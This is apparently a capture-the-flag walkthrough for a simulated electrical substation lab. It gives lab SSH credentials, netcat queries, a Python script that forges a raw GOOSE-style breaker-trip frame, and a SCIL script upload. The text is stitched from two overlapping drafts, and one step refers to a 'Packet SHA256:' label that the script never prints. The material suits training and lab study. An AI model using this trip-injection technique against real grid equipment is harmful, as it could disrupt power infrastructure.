# Red-Writeup: Stage 5 — Substation Gateway and Bay Controller

## Technical Concept & Architecture

The final stage of the Hacktify range simulates the inner layers of a substation network: the Station Zone (L3 TCP/IP) and the Process Zone (L2 multicast/Ethernet-only).

```
  [ Station Zone (10.100.2.0/24 Bridge) ]
        |                              |
        v                              v
+---------------+              +----------------+
|    EWS Node   |              | Bay Controller | (MMS Service :102)
| (10.100.2.2)  |              |  (10.100.2.10) | (SCIL Interface :9022)
+---------------+              +----------------+
        |                              |
        v                              v
+---------------+              +----------------+
| Substation GW |              | Bay Controller | (L2 GOOSE Responder)
| (10.100.2.254)|              |  (10.100.3.2)  |
+---------------+              +----------------+
        |                              |
        +--------------+---------------+
                       |
                       v
     [ Process Zone (10.100.3.0/24 Macvlan) ]
```

### The L2/L3 Boundary
In modern automated substations, real-time control traffic (like GOOSE) is transmitted directly over Ethernet (Layer 2) to achieve sub-millisecond latencies. Because L2 multicast packets do not have IP headers, they are not routed across IP boundaries.

The bridge network (`station_zone_net`) isolates Layer 2 multicast traffic. In this lab, we enforce this structurally by utilizing a `macvlan` network (`process_zone_net`) backed by a host-level dummy interface (`dummy0`) for all process-level communications. 

Because `substation-gw` is the only container with interfaces in both networks, players must first compromise and gain shell access to `substation-gw` to interact with the Process Zone. Any attempt to sniff or inject GOOSE-equivalent traffic from the EWS or OT networks will fail because the networks are completely isolated at Layer 2.

### Protocol Hardening & Validation Rules
The bay-controller's L2 multicast responder enforces strict rules typical of high-security OT environments:
1. **Config Revision (`confRev`):** The configuration revision in the GOOSE packet must exactly match `GOOSE_CONF_REV` (`7366`). In actual deployments, mismatched config revisions indicate stale engineering parameters or unauthorized message crafting, resulting in silent discard.
2. **Sequence Control (`sqNum`):** To prevent replay attacks, the sequencer must strictly increase with every received packet. If a packet is received with `sqNum` less than or equal to the last accepted sequence number, the packet is silently discarded.

---

## Walkthrough

### 1. Stage 4b: Gateway Compromise and Interface Enumeration
1. Enumerate the subnet and pivot into `substation-gw` (`10.100.2.254`) via SSH using the credentials `field_tech:FieldTech2024!`.
2. Inspect the interfaces:
   ```bash
   ip addr show
   ```
   You will notice two interfaces:
   * `eth0`: Connected to the `station_zone_net` bridge (`10.100.2.254`).
   * `eth1`: Connected to the `process_zone_net` macvlan (`10.100.3.1`).
3. The MAC address of `eth1` (the process zone interface) is the artifact. It can be found via:
   ```bash
   cat /sys/class/net/eth1/address
   ```
4. The Stage 4b flag is computed as:
   ```python
   derive_flag(seed, "4b", mac_address)
   ```
   And verified against the stored flag at `/run/ctf/stage4b_flag` inside `substation-gw`.

### 2. Stage 5a: Layer 2 Multicast (GOOSE) Injection
1. Query the automation service running on `bay-controller` (`10.100.2.10`) on port `102` using the `LIST` or `READ` commands to retrieve the active configuration revision:
   ```bash
   echo "READ LLN0$CF$ConfRev" | nc 10.100.2.10 102
   # Returns: 7366
   ```
2. Build an attack payload containing:
   * **Destination MAC:** `01:0c:cd:01:8a:04` (multicast address)
   * **EtherType:** `0x88B8` (GOOSE)
   * **Payload Structure:**
     * `APPID`: `0x8A04` (2 bytes)
     * `Length`: `17` (2 bytes)
     * `confRev`: `7366` (4 bytes)
     * `sqNum`: `1` (or strictly greater than last accepted sequence) (4 bytes)
     * `stNum`: `1` (4 bytes)
     * `trip`: `1` (1 byte)
3. Since we must send raw Ethernet packets, we execute a python script directly from our shell session on `substation-gw` to inject the packet onto the `eth1` interface.
4. Once the packet is received and accepted by the L2 responder, the breaker state changes to `TRIPPED`. You can verify this by checking:
   ```bash
   echo "READ XCBR1$ST$Pos$stVal" | nc 10.100.2.10 102
   # Returns: TRIPPED
   ```
5. The Stage 5a flag is computed inside `/run/ctf/stage5a_flag` on `bay-controller` as:
   ```python
   derive_flag(seed, "5a", sha256_hash_of_packet_bytes)
   ```

### 3. Stage 5b: Legacy SCIL Scripting Exploitation
1. Connect to the legacy scripting port `9022` on `bay-controller` (`10.100.2.10`).
2. Upload a valid SCIL script targeting `SCIL_EXPECTED_IOA` (`2947`).
   ```scil
   ; SCIL command
   #SET IX:Pioa = 2947
   #SET IX:PValue = 1
   ```
3. Send this script over the TCP connection:
   ```bash
   cat script.scil | nc 10.100.2.10 9022
   # Returns: TOKEN_OK:<timestamp>:<client_ip>:<script_hash>
   ```
4. The token output is the artifact used to verify the Stage 5b flag.
5. The Stage 5b flag is computed inside `/run/ctf/stage5b_flag` on `bay-controller` as:
   ```python
   derive_flag(seed, "5b", token_string)
   ```











































Part 1 — Stage 4b: Access Substation Gateway
Step 1 — SSH into substation-gw

Use the same field technician credentials:

ssh field_tech@10.100.2.254

Password:

FieldTech2024!

If SSH asks about host authenticity, type:

yes
Step 2 — Check gateway interfaces

Inside substation-gw, run:

ip addr show

You should see that the gateway has two network sides:

Station Zone interface → 10.100.2.254
Process Zone interface → 10.100.3.1

Now identify the process-zone interface automatically:

ip -o addr show | grep '10.100.3.'

You may see something like:

eth1    inet 10.100.3.1/24

So the process-zone interface is probably:

eth1
Step 3 — Collect process-zone MAC address

Run:

IFACE=$(ip -o addr show | grep '10.100.3.' | awk '{print $2}' | head -n 1)
echo "$IFACE"
cat /sys/class/net/$IFACE/address

Example output:

eth1
02:42:0a:64:03:01

This MAC address is the Stage 4b artifact.

What this proves:

The attacker has compromised the substation gateway and confirmed that it has process-zone access.
Part 2 — Stage 5a: GOOSE-style L2 Trip Injection

This is the main visual/impact part.

Before the attack, the bay-controller breaker should be:

CLOSED

After the attack, it should become:

TRIPPED
Step 4 — Read current breaker state before attack

Still inside substation-gw, run:

echo 'READ XCBR1$ST$Pos$stVal' | nc 10.100.2.10 102

Expected before attack:

CLOSED

This is the before state.

Step 5 — Read GOOSE configuration revision

Run:

echo 'READ LLN0$CF$ConfRev' | nc 10.100.2.10 102

Expected output:

7366

This value is important because the bay-controller only accepts packets with the correct confRev.

Your validation script also reads LLN0$CF$ConfRev from 10.100.2.10:102 before building the GOOSE packet.

Step 6 — Send the GOOSE-style trip packet

Use this from inside substation-gw.

This sends a raw Ethernet frame on the process-zone interface.

sudo python3 - <<'PY'
import socket, struct, hashlib, subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.100.2.10", 102))
s.sendall(b"READ LLN0$CF$ConfRev\n")
conf_rev = int(s.recv(1024).decode().strip())
s.close()

iface = next((l.split()[1] for l in subprocess.check_output(["ip","-o","addr","show"]).decode().splitlines() if "10.100.3." in l), "eth1")
src_mac = bytes.fromhex(open(f"/sys/class/net/{iface}/address").read().strip().replace(":",""))
dst_mac = bytes.fromhex("010ccd018a04")

packet = struct.pack("!6s6sH", dst_mac, src_mac, 0x88B8) + struct.pack("!HHIIIB", 0x8A04, 17, conf_rev, 1, 1, 1)

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x88B8))
sock.bind((iface, 0))
sock.send(packet)

print(conf_rev, iface, hashlib.sha256(packet).hexdigest())
PY

Copy the value printed after:

Packet SHA256:

That SHA256 hash is the Stage 5a artifact.

Your reference attack script computes Stage 5a from the SHA256 hash of the packet bytes, so this is the correct artifact to preserve.

Step 7 — Verify breaker state after attack

Run:

echo 'READ XCBR1$ST$Pos$stVal' | nc 10.100.2.10 102

Expected after attack:

TRIPPED

This proves the operational impact:

Before attack → CLOSED
After attack  → TRIPPED

So Stage 5a attack achieved:

GOOSE-style Layer 2 trip injection accepted by bay-controller.
Part 3 — Stage 5b: Legacy SCIL Scripting Exploitation

Now you abuse the legacy scripting service on the bay-controller.

Target:

10.100.2.10:9022
Step 8 — Create the SCIL script

Inside substation-gw, run:

cat > script.scil <<'EOF'
; SCIL control script
#SET IX:Pioa = 2947
#SET IX:PValue = 1
EOF

This script targets IOA:

2947

and sets the value to:

1

The reference script sends the same values to the SCIL interface, using SCIL_EXPECTED_IOA and PValue = 1.

Step 9 — Send the script to the SCIL service

Run:

nc 10.100.2.10 9022 < script.scil

Expected output:

TOKEN_OK:<timestamp>:<client_ip>:<script_hash>

Example:

TOKEN_OK:1783149301:10.100.2.254:ab12cd34ef56...